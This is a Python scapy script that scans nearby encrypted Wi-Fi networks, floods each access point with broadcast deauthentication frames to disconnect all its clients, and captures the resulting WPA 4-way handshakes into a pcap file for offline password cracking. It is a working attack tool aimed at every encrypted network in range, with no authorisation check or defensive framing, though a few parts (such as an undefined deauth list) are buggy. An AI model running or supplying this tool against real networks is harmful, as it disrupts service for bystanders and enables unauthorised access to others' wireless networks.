#subtype for clinet = 0,2,4
#subtype for becon frame = 8

# addr1 = from adress
# addr2 = to adress
from scapy.all import *
import os
import time
from threading import Thread, current_thread, main_thread
import datetime
from scapy.contrib.wpa_eapol import WPA_key

interface = "wlan0mon"
scan_time = 15 # in seconds
deauth_packet_count = 60
clients = []
pcap_file = './dump.pcap'
TO_DS = 0b01
network_list = []
beacon_frame = False
handshake_dict = {}
pcap = PcapWriter(pcap_file, append=True, sync=True)

def deauth(AP_addr):
    target_addr = "ff:ff:ff:ff:ff:ff" #Deauth All clients
    dot11 = Dot11(addr1=target_addr, addr2=AP_addr, addr3=AP_addr)
    frame = RadioTap()/dot11/Dot11Deauth()
    #print("Deauthing: %s,%s"%(to_addr, from_addr))
    sendp(frame, iface=interface, count=deauth_packet_count)

def run_deauth(AP_addr):
    deauther = Thread(target=deauth(AP_addr))
    deauther.daemon = True
    deauther.start()

def auto_change_channel():
    ch = 1
    stop_time = datetime.datetime.now() + datetime.timedelta(seconds=scan_time)
    while stop_time > datetime.datetime.now():
        os.system("iwconfig " + interface + " channel " + str(ch))
        #switch channel from 1 to 14 each 0.5s
        ch = ch % 14 + 1
        print("channel changed! to " + str(ch))
        time.sleep(.5)

def change_channel(channel):
    return os.system("iwconfig " + interface + " channel " + str(channel))



def create_network_list(pkt):
    if pkt.haslayer(Dot11):
        if pkt.type == 0 and pkt.subtype == 8:
            print(pkt.info)
            stats = pkt[Dot11Beacon].network_stats()
            channel = stats.get('channel')
            encryption = stats.get('crypto')
            if encryption != 'none':
                if pkt.info.decode() not in (i[0] for i in network_list):
                    network_list.append((pkt.info.decode(),pkt.addr3,channel))
            


# Run this function when a packet is received
def packet_handler(pkt):
    if pkt.haslayer(Dot11):
        if pkt.type == 2:
            #print("BSSID:%s\nClient:%s"%(pkt.addr1,pkt.addr2))
            if (pkt.addr1,pkt.addr2) not in deauthlist:
                #print(pkt.addr1 + " " + pkt.addr2)
                if str(pkt.addr1) != "ff:ff:ff:ff:ff:ff":
                    deauth(pkt.addr2)

def check_for_handshake(pkt):
    global beacon_frame
    global current_network
    if pkt.haslayer(Dot11):
        if pkt.type == 0 and pkt.subtype == 8:
            if beacon_frame == False and pkt.addr2 == current_network:
                pcap.write(pkt)
                beacon_frame = True
    if pkt.haslayer(WPA_key):
        layer = pkt.getlayer(WPA_key)
        print("WPA_key Packet Found!")
        #pktdump.write(pkt)
        to_ds = pkt.FCfield & TO_DS != 0        
        # sent to client
        if to_ds:
            client = pkt.addr2
        # sent from client
        else:
            client = pkt.addr1
    
        if not client in handshake_dict:
            fields = {
                'frame2': None,
                'frame3': None,
                'frame4': None,
                'replay_counter': None,
                'packets': []
            }
            handshake_dict[client] = fields
        
        key_info = layer.key_info
        wpa_key_length = layer.wpa_key_length
        replay_counter = layer.replay_counter
        WPA_KEY_INFO_INSTALL = 64
        WPA_KEY_INFO_ACK = 128
        WPA_KEY_INFO_MIC = 256
        
        if (key_info & WPA_KEY_INFO_MIC) and (key_info & WPA_KEY_INFO_ACK == 0) and (key_info & WPA_KEY_INFO_INSTALL == 0) and (wpa_key_length > 0):
            handshake_dict[client]['frame2'] = 1
            handshake_dict[client]['packets'].append(pkt)
            print("Found packet 2 for %s" % client)
        
        elif (key_info & WPA_KEY_INFO_MIC) and (key_info & WPA_KEY_INFO_ACK) and (key_info & WPA_KEY_INFO_INSTALL):
            handshake_dict[client]['frame3'] = 1
            handshake_dict[client]['packets'].append(pkt)
            handshake_dict[client]['replay_counter'] = replay_counter
            print("Found packet 3 for %s" % client)

        elif (key_info & WPA_KEY_INFO_MIC) and (key_info & WPA_KEY_INFO_ACK == 0) and (key_info & WPA_KEY_INFO_INSTALL == 0) and (handshake_dict[client]['replay_counter'] == replay_counter):
            handshake_dict[client]['frame4'] = 1
            handshake_dict[client]['packets'].append(pkt)
            print("Found packet 4 for %s" % client)

        # if we have the 4 way handshake
        if (handshake_dict[client]['frame2'] and handshake_dict[client]['frame3'] and handshake_dict[client]['frame4']):
            print("Got Handshake from %s"%client)
            beacon_frame = False
            pcap.write(handshake_dict[client]['packets'])
            return True
        else:
            return False

def collect_networks():
    #channel_changer = Thread(target=auto_change_channel)
    #channel_changer.daemon = True
    #channel_changer.start()
    sniff(iface=interface, prn=create_network_list, timeout=scan_time)
    
def main():
    global current_network
    try:
        collect_networks()
        for network in network_list:
            print("Attacking %s"%network[0])
            current_network = network[1]
            change_channel(network[2])
            run_deauth(network[1])
            handshake_dict = {}
            sniff(iface=interface, stop_filter=check_for_handshake, timeout=20)
            # sniff for handshakes here put a timeout of 1 min
    except KeyboardInterrupt:
            exit()

if __name__ == "__main__":
    main()
